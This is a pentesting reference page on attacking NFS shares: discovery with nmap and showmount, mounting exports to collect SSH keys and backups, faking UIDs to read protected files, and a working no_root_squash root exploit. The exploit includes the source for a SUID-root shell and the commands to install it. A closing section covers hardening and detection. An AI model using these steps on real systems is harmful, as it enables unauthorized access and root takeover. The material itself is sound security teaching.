# NFS

Network File System — Unix/Linux file sharing, the *nix counterpart to [SMB](smb.md). On **port 2049** (plus **111** rpcbind/portmapper for v2/v3). Two reasons it matters on an engagement: exports are frequently world-readable (loot with zero creds), and a misconfigured export (`no_root_squash`) is a clean **root** privesc.

> Authorized testing only. NFS has no real authentication in v3 — it trusts the client's IP and UID — so "I could read it" is often a finding in itself.

## Contents

- [Discover it](#discover-it)
- [List exports — showmount](#list-exports--showmount)
- [Mount it and read the contents](#mount-it-and-read-the-contents)
- [UID matching — reading files you "can't"](#uid-matching--reading-files-you-cant)
- [no_root_squash → root (privesc)](#no_root_squash--root-privesc)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Discover it

```bash
nmap -p111,2049 -sV <target>
nmap -p111 --script "rpcinfo" <target>                         # is NFS/mountd registered?
nmap -p111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" <target>   # exports + a dir listing in one shot
rpcinfo -p <target>                                            # list RPC services (look for nfs, mountd)
```

`nmap --script nfs-*` is the fastest first look — `nfs-showmount` lists the exports and `nfs-ls` even dumps a directory listing without mounting.

## List exports — showmount

`showmount` asks the server what it shares and to whom.

```bash
showmount -e <target>        # -e = exports: the shares and which hosts/subnets may mount them
showmount -a <target>        # -a = all current mounts (which clients have mounted what)
showmount -d <target>        # -d = directories currently mounted
```

```text
$ showmount -e 10.10.10.40
Export list for 10.10.10.40:
/home        *                 <- exported to EVERYONE
/backups     10.10.10.0/24
/srv/secret  *
```

A `*` in the client column means **any host can mount it** — that's the one to go for. Note each export; you mount them next.

## Mount it and read the contents

Mount the export locally, then browse it like any directory.

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <target>:/srv/secret /mnt/nfs -o nolock      # mount the export
sudo mount -t nfs -o vers=3 <target>:/srv/secret /mnt/nfs      # force NFSv3 if the default (v4) fails
ls -la /mnt/nfs                                                # read the contents
# ... loot: configs, SSH keys, backups, source ...
sudo umount /mnt/nfs                                           # unmount when done
```

Tips:

- **`-o nolock`** avoids hanging on a missing lock daemon — use it by default on a pentest.
- If the mount is refused, try `-o vers=3` (or `vers=2`); modern clients default to v4 and some servers only speak v3.
- Mount **read-only** when you only need to look: `-o ro`. Mount read-write only when you intend to write (see privesc below), and clean up anything you create.
- Loot the usual: `/home/*/.ssh/id_rsa`, `.bash_history`, config files, DB dumps, backups — then feed finds to [exfiltration of secrets](../Privilege%20Escalation/exfiltrationofsecrets.md).

## UID matching — reading files you "can't"

NFS (v3) enforces permissions by **UID number**, and it trusts the UID your client sends. So a file owned by UID 1005 with `-rw-------` is readable by *your* UID 1005 — the server never checks who you really are.

```bash
ls -lan /mnt/nfs            # -n shows numeric UIDs/GIDs, e.g. a file owned by 1005
# can't read it? create a local user with that UID and switch to it:
sudo useradd -u 1005 nfsuser
sudo -u nfsuser cat /mnt/nfs/private_file
```

This is why NFS exports leak: the server's access control is only as good as the client it trusts, and you control your client.

## no_root_squash → root (privesc)

The headline NFS attack. Normally the server **squashes** a client's root to the unprivileged `nobody` (`root_squash`, the default). If an export is set `no_root_squash`, then **root on your client is root on the server's filesystem** — so you write a root-owned SUID shell into the export and run it on the target.

```bash
# 1. confirm the export allows it (you need root on your own box)
showmount -e <target>
sudo mount -t nfs <target>:/srv/secret /mnt/nfs -o nolock

# 2. as ROOT on your box, drop a SUID-root shell into the share
cat > /mnt/nfs/rootsh.c <<'C'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/sh","sh",0); return 0; }
C
gcc /mnt/nfs/rootsh.c -o /mnt/nfs/rootsh
sudo chown root:root /mnt/nfs/rootsh
sudo chmod u+s /mnt/nfs/rootsh            # SUID bit — the file is now root-owned + SUID on the SERVER too

# 3. on the TARGET (as any user), the same file is there — run it for a root shell
./rootsh            # id -> uid=0(root)
```

The SUID bit survives because you and the server share the same files; root on the client wrote a root-owned SUID binary, and the target happily honours it. This is the NFS half of the `no_root_squash` note in [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md). (If you have a shell on the target but no root on your attack box, do steps 2–3 from any box where you *are* root, even a local VM.)

## Defense / detection

- Keep **`root_squash`** on (the default) and add **`all_squash`** where clients don't need to preserve ownership; never `no_root_squash` on anything reachable.
- Export to **specific hosts/subnets**, never `*`; set `ro` unless write is required; put exports on their own segment.
- Move to **NFSv4 with Kerberos (`sec=krb5`)** — it adds the authentication v3 lacks (UID trust is the root cause of the attacks above).
- Detect: unexpected `mountd`/`showmount` queries, mounts from unknown clients, and new SUID files appearing in an export. See [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md) and [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md).

## Related

[smb](smb.md) (the Windows-side equivalent) · [nmap](../Tools/nmap.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) (`no_root_squash`) · [exfiltration of secrets](../Privilege%20Escalation/exfiltrationofsecrets.md) · [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md) · [folder README](README.md)
